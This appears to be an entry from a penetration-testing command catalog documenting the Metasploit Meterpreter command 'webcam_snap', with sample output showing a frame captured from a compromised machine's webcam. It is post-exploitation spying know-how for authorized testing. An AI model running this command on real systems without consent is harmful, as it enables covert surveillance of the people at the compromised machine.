---
id: 9832aa83-a092-4748-b046-bc68a5fdde97
name: Metasploit Take a Snapshot from the Specified Webcam
type: command
executor: metasploit
data: webcam_snap -i $_WEBCAM_ID
output: 'meterpreter > webcam_snap -i 1

  [*] Starting...

  [+] Got frame

  [*] Stopped

  Webcam shot saved to: /root/TwAFDLnF.jpeg

  '
created_at: '2020-07-09T00:04:02.925945+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Metasploit Take a Snapshot from the Specified Webcam

```metasploit
webcam_snap -i $_WEBCAM_ID
```

## Expected Output

```
meterpreter > webcam_snap -i 1
[*] Starting...
[+] Got frame
[*] Stopped
Webcam shot saved to: /root/TwAFDLnF.jpeg

```


